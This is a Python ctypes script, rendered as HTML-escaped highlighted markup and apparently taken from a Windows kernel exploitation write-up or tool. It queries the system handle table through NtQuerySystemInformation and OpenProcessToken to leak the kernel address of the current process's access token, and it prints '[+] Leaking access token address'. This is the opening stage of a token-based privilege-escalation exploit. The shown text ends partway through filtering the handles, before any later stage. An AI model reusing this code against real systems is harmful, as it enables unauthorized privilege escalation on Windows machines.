&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ctypes.wintypes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Shorthands for some ctypes stuff.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;psapi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;psapi&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;advapi32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;advapi32&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;OpenProcessToken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;advapi32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OpenProcessToken&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Constants.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;STATUS_SUCCESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;STATUS_INFO_LENGTH_MISMATCH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000004&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;STATUS_INVALID_HANDLE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000008&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;TOKEN_QUERY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SystemExtendedHandleInformation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PHANDLE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG_PTR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_void_p&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Function signature helpers.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NtQuerySystemInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argtypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NtQuerySystemInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;restype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;advapi32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OpenProcessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argtypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;advapi32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OpenProcessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;restype&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Structures for NtQuerySystemInformation.
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_fields_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Object&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;UniqueProcessId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HandleValue&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GrantedAccess&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CreatorBackTraceIndex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;USHORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ObjectTypeIndex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;USHORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HandleAttributes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Reserved&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SYSTEM_HANDLE_INFORMATION_EX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_fields_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;NumberOfHandles&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Reserved&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Handles&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;find_handles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Parses the output of NtQuerySystemInformation to find handles associated
    with the given PID.
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYSTEM_HANDLE_INFORMATION_EX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;nentries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberOfHandles&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Leaking access token address'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;handles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Manually unpacking the struct because of issues with ctypes.parse
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nentries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;QQQLHHLL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;nentries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hpid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hpid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;handles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handles&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_token_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Leverage userland APIs to leak the current process' token address in kernel
    land.
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hProc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentProcessId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Current PID: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OpenProcessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[-] Error getting token handle: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetLastError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Token Handle: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Find the handles associated with the current process
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_INFO_LENGTH_MISMATCH&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_INFO_LENGTH_MISMATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;handle_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_ubyte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NtQuerySystemInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SystemExtendedHandleInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handle_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Parse handle_info to retrieve handles for the current PID
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;handles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_handles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
